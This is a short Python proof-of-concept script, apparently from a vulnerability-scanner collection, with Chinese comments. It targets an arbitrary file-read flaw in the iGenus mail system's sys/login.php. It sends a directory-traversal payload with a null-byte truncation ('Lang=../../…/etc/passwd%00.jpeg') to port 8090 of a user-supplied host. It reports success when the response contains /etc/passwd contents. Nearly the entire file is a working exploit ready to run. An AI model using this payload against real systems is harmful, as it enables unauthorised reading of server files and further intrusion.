#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: iGenus邮箱系统管理中心sys/login.php 参数Lang任意文件读取
referer: http://www.wooyun.org/bugs/WooYun-2015-146923
author: Lucifer
description: Lang存在遍历，%00截断 8090端口。
'''
import sys
import requests
import warnings
from termcolor import cprint

class igenus_syslogin_Lang_fileread_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/sys/login.php?Lang=../../../../../../../../../../etc/passwd%00.jpeg&cmd=form"
        port = 8090
        vulnurl = self.url + ":" + str(port) + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"root:" in req.text and r"/bin/bash" in req.text:
                cprint("[+]存在iGenus邮箱系统管理中心sys/login.php 参数Lang任意文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = igenus_syslogin_Lang_fileread_BaseVerify(sys.argv[1])
    testVuln.run()